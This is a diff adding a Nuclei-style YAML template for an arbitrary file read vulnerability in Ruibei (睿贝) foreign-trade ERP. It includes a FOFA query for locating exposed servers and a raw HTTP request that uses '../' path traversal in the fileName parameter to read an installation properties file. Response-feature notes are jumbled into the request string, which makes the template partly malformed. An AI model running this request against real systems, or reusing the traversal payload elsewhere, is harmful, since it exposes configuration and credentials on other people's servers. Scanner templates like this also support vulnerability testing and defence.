@@ -1,0 +1,40 @@
+id: poc-ymk6xrz06oiq1396
+info:
+  name: 睿贝外贸ERP appPatchDownLoad 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ymk6xrz06oiq1396'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ymk6xrz06oiq1396
+    fofa: body="loginNeedMobileNumVerification" || body="睿贝软件"
+http:
+- raw:
+  - 'GET /appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    system
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
